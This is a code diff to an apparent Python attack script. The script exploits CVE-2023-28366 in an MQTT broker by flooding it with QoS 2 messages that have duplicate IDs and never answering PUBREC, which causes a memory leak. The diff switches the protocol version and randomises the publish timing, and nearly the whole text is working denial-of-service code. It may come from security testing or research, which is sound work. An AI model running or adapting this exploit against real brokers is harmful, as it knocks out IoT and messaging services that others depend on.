@@ -16,7 +16,7 @@ class PoisonedClient1(mqtt.Client):
         return 0
 
 
-def main(username, password, duration=10, number=100):
+def main(username, password, duration=10.0, number=100.0):
     """In Quality of Service 2 and duplicate Message ID attack we exploit CVE-2023-28366 and send many messages with the described properties without responding to PUBREC commands to cause a memory leak"""""
     reconnect_delay = 10
     connection = util.Connection_status()
@@ -24,7 +24,7 @@ def main(username, password, duration=10, number=100):
     while True:
 
         client_p = PoisonedClient1(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": connection},
-                                   protocol=mqtt.MQTTv5)
+                                   protocol=mqtt.MQTTv311)
         client_p.username_pw_set(username, password)
         client_p.on_connect = util.on_connect
         client_p.on_disconnect = util.on_disconnect
@@ -34,7 +34,7 @@ def main(username, password, duration=10, number=100):
         if util.connect_client(client_p, connection, reconnect_delay):
             for i in range(number):
                 client_p.publish(topics[random.randint(0, len(topics)-1)], "whatever", qos=2)
-                time.sleep(interval)
+                time.sleep(interval*random.random())
             return
         else:
             print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
